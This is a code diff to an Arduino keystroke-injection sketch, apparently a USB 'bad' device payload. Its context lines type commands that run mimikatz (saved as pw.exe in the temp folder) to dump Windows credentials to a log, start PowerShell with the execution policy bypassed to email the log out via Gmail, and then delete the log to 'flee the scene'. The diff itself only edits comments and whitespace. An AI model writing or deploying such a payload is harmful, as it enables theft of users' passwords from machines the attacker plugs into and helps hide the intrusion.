@@ -35,7 +35,7 @@ void setup()
   typeKey(KEY_RETURN);
   delay(1500);
 
-  // run and get output from mimikatz
+  // execute and export output from mimikatz
   Keyboard.print("%TEMP%\\pw.exe > C:\\pwlog.txt & type C:\\pwlog.txt;");
   typeKey(KEY_RETURN);
   delay(100);
@@ -50,7 +50,7 @@ void setup()
   typeKey(KEY_RETURN);
   delay(300);
 
-  // -------------email log via gmail
+  // email log via gmail
   Keyboard.print("powershell -ExecutionPolicy ByPass");
   typeKey(KEY_RETURN);
   delay(300);
@@ -82,7 +82,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  // ---------------------delete and end
+  // Cleanup and flee the scene.
   Keyboard.print("del C:\\pwlog.txt");
   typeKey(KEY_RETURN);
   delay(300);
@@ -94,6 +94,3 @@ void setup()
 
 /* Unused endless loop */
 void loop() {}
-
-
-
